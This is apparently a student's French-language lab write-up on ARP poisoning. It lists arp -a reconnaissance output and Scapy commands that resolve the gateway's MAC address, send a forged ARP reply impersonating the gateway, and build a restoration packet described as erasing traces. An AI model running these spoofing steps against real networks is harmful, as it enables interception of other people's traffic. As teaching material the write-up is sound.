# Partie 2 ARP poisoning 

## A. Offensive

### ARP Spoofing

**Etapes de l'attaque:** 

- arp -a (repérage)
```
Interface : 192.168.56.1 --- 0xe
  Adresse Internet      Adresse physique      Type
  192.168.56.101        08-00-27-72-b7-65     dynamique
  192.168.56.255        ff-ff-ff-ff-ff-ff     statique
  224.0.0.2             01-00-5e-00-00-02     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique

Interface : 192.168.33.1 --- 0x11
  Adresse Internet      Adresse physique      Type
  192.168.33.255        ff-ff-ff-ff-ff-ff     statique
  224.0.0.2             01-00-5e-00-00-02     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique

Interface : 192.168.10.1 --- 0x17
  Adresse Internet      Adresse physique      Type
  192.168.10.255        ff-ff-ff-ff-ff-ff     statique
  224.0.0.2             01-00-5e-00-00-02     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique

Interface : 192.168.1.82 --- 0x19
  Adresse Internet      Adresse physique      Type
  192.168.1.1           60-35-c0-27-04-a8     dynamique
  192.168.1.36          2c-54-91-c5-4c-5b     dynamique
  192.168.1.58          f0-0f-ec-2f-a2-7d     dynamique
  192.168.1.255         ff-ff-ff-ff-ff-ff     statique
  224.0.0.2             01-00-5e-00-00-02     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique
  255.255.255.255       ff-ff-ff-ff-ff-ff     statique
  ``` 
- Cible trouvé maintenant trouver son addresse physique (MAC)
- On envoit donc un message broadcast
- arpbroadcast = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst="192.168.1.1")
- arpbroadcast.show()
```
###[ Ethernet ]###
  dst= ff:ff:ff:ff:ff:ff
  src= 1c:87:2c:b8:fd:4f
  type= ARP
###[ ARP ]###
     hwtype= 0x1
     ptype= IPv4
     hwlen= None
     plen= None
     op= who-has
     hwsrc= 1c:87:2c:b8:fd:4f
     psrc= 192.168.1.82
     hwdst= 00:00:00:00:00:00
     pdst= 192.168.1.1
```
- received = srp(arpbroadcast, timeout=2)
```
>>> received[0][0][1].hwsrc
'84:fd:d1:14:a6:9f'
```

- ensuite nous allons envoyer de fausses réponses arp
- arpspoof= ARP(op=2, psrc="192.168.1.1", pdst="192.168.1.82", hwdst="84:fd:d1:14:a6:9f")
- send(arpspoof)

- Attaque terminée maintenant il faut effacer les traces 
- restoration = ARP(op=2, psrc='192.168.1.1', hwsrc="84:fd:d1:14:a6:9f", pdst= '192.168.1.82', hwdst="84:fd:d1:14:a6:9f")


